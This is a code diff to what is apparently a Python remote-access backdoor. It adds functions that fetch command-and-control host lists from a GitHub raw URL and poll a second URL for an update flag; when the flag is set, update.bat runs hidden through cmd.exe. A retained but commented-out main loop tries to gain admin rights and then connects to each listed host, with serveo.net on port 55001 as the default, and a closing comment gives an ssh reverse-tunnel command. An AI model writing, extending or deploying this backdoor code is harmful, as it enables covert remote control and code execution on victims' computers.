@@ -164,21 +164,86 @@ class backdoor:
                 time.sleep(3)
                 break
 
+#/////// IP:PORT ////////////
 
+def get_ips_ready():
+    with open('ip_address.txt', 'r') as file:
+        ips2 = file.readlines()
+        for ip in ips2:
+            if ip[len(ip)-2:len(ip):] == '\n':
+                ips.append(ip)
+            elif ip[0:len(ip)-2:] not in ips:
+                ips.append(ip[0:len(ip)-2:])
+            else:
+                print(f'{ip}!')
+
+ips = ['serveo.net']
+
+def add_all_ips(ip_addresses):
+    with open('ip_address.txt', 'r+') as file:
+        file_content = file.readlines()
+        for ip in ip_addresses:
+            if ip not in file_content:
+                file.write(f'{ip}\n')
+            else:
+                pass
+
+def check_for_new_ips():
+    url = "https://raw.githubusercontent.com/Jevelin4k/backdoor/refs/heads/main/v2.0/port.txt"
+    response = requests.get(url)
+    response.raise_for_status()
+
+    text = response.text
+    if text != '':
+        for t in text.split():
+            if t[0:len(t)-2:] not in ips:
+                ips.append(t)
+        counter = 0
+    else:
+        counter = 0
+
+def check_for_updates():
+    url = "https://raw.githubusercontent.com/Jevelin4k/backdoor/refs/heads/main/v2.0/update.txt"
+    response = requests.get(url)
+    response.raise_for_status()
+
+    text = response.text
+    if text == 'True':
+        subprocess.Popen(['cmd.exe', '/c', 'update.bat'],
+                         creationflags=subprocess.CREATE_NO_WINDOW)
+    elif text == 'False':
+        pass
+    else:
+        pass
 
 if __name__ == "__main__":
-    try:
+    get_ips_ready()
+    print(ips)
+
+    counter = 20
+    if counter == 20:
+        check_for_new_ips()
+        add_all_ips(ips)
+
+    print(ips)
+
+    '''try:
         try:
             run_as_admin()
         except Exception:
             pass
 
         while True:
-            REMOTE_HOST = 'serveo.net'
-            REMOTE_PORT = 55001
+            for ip_address in ips:
+                REMOTE_HOST = ip_address
+                REMOTE_PORT = 55001
 
-            backdoor(REMOTE_HOST, REMOTE_PORT)
+                backdoor(REMOTE_HOST, REMOTE_PORT)
+
+            print('CYCLE')
+            time.sleep(10)
+
     except Exception:
-        print("exit")
+        print("exit")'''
 
 #ssh -R 55000:localhost:55000 serveo.net
